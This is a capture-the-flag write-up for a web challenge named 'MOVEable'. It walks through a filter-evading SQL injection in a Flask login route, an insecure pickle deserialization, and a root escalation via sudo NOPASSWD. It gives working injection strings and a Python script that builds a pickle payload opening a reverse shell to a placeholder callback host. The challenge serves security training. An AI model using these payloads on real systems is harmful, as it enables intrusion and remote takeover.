# MOVEable

## Description

<small>Author: @JohnHammond#6971</small><br><br>Ever wanted to move your files? You know, like with a fancy web based GUI instead of just FTP or something? <br><br> Well now you can, with our super secure app, <b>MOVEable</b>!  <br><br> Escalate your privileges and find the flag. <br> <br> <b>Download the file(s) below and press the <code>Start</code> button on the top-right to begin this challenge.</b>


## Files

* [app.zip](<files/app.zip>)


## Solution

MOVEable is a live service with both a SQL injection and insecure deserialization vulnerability.

Source code was provided with the challenge, making it a bit easier.

The first thing to note is that the `login` route has a SQLi vulnerability, though some sanitation is applied using the `DBClean()` method on the username and password inputs.

```python
    username = DBClean(request.form['username'])
    password = DBClean(request.form['password'])
    
    conn = get_db()
    c = conn.cursor()
    sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    c.executescript(sql)
    user = c.fetchone()
```

> Note: `fetchone()` doesn't work with `executescript()`, so this code is intentionally buggy

We can still construct a malicious query such as the following, which will add a user to the database:
```
aaaa\;INSERT/**/INTO/**/users/**/VALUES/**/(\myuser\,\mypass\);-- -
```

Further down in the code, we notice the usage of `pickle` to deserialize files stored in the database. This can lead to possible RCE if we can execute that code with malicious input. We can, but we need a valid user and session first. We can do that by running two queries to setup the database how we want it:

```
Create a user:
aaaa\;INSERT/**/INTO/**/users/**/VALUES/**/(\myuser\,\mypass\);-- -

Create an active session:
aaaa\;INSERT/**/INTO/**/activesessions/**/VALUES/**/(\12345\,\myuser\,\2024-10-17 18:00:00\);-- -
```

After this, we need to create a malicious pickle object and put it in the database.

We can do this pretty easily, with the exception that I had an issue with the following lines of code raising an error:

```python
    file_blob = pickle.loads(base64.b64decode(file_data[0]))
    try:    
        return send_file(io.BytesIO(file_blob), download_name=filename, as_attachment=True)
    except TypeError:
        flash("ERROR: Failed to retrieve file. Are you trying to hack us?!?")
        return redirect(url_for('files'))
```

This can be bypassed by wrapping our exploit in a call to `flash()`, where we can display the output of our exploits instead.

We don't need to do anything too special though, it's possible to just get a reverse shell. 

I used the following script to generate the malicious payload:
```python
#!/usr/bin/env python3

import pickle
import base64
import flask
import os


class RCE(object):

    def __reduce__(self):
        return (os.system,('''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<CALLBACK_IP>",<CALLBACK_PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' ''',))

with open("output.pickle", "wb") as output_file:
    pickle.dump(RCE(), output_file)
    output_file.close()

with open("output.pickle", "rb") as output_file:
    data = output_file.read()
    #base64 encode
    data = base64.b64encode(data)
    #format string
    data = data.decode()
    print(fr"aaaa\;INSERT/**/INTO/**/files/**/VALUES/**/(\write\,\{data}\,\12345\);-- -")
```

Submitting the query via SQLi, then navigating to the download page should execute the malicious payload and let you catch the reverse shell.

From there, you are required to escalate your privileges you read the file in `/root/flag.txt`.

The escalation path is a simple `sudo -i` because the moveable user is in the sudoers file as `NOPASSWD: ALL`.